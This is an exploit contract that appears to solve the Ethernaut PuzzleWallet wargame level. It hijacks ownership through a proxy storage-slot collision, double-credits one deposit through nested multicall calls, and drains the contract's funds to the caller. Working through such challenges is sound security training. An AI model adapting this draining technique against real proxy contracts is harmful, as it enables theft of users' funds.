// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

/**
 * @title PuzzleWalletExploit
 * @notice Ethernaut Level 24: Proxy storage collision + multicall reentrancy
 * @dev Exploits delegatecall storage collision between proxy and implementation
 */
contract PuzzleWalletExploit {
    IPuzzleWallet public target;
    
    constructor(address _target) {
        target = IPuzzleWallet(_target);
    }
    
    /**
     * @notice Full exploit chain
     * @dev 
     * Step 1: Call proposeNewAdmin() on proxy â†’ sets storage slot 0 (owner in logic)
     * Step 2: Add ourselves to whitelist as "owner" 
     * Step 3: Use multicall reentrancy to double-spend deposits
     * Step 4: Drain contract via execute()
     */
    function attack() external payable {
        require(msg.value >= 0.001 ether, "Need 0.001 ETH");
        
        // Step 1: Become "pendingAdmin" which collides with "owner" slot
        // Proxy storage slot 0 = pendingAdmin
        // Logic storage slot 0 = owner
        target.proposeNewAdmin(address(this));
        
        // Step 2: Now we're "owner", whitelist ourselves
        target.addToWhitelist(address(this));
        
        // Step 3: Multicall reentrancy - deposit once, credit twice
        // Craft nested multicall to call deposit() twice with one payment
        bytes[] memory depositCalls = new bytes[](1);
        depositCalls[0] = abi.encodeWithSignature("deposit()");
        
        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSignature("deposit()");
        multicallData[1] = abi.encodeWithSignature("multicall(bytes[])", depositCalls);
        
        // One deposit worth of ETH credits us twice
        target.multicall{value: 0.001 ether}(multicallData);
        
        // Step 4: Drain all funds
        target.execute(msg.sender, address(target).balance, "");
    }
}
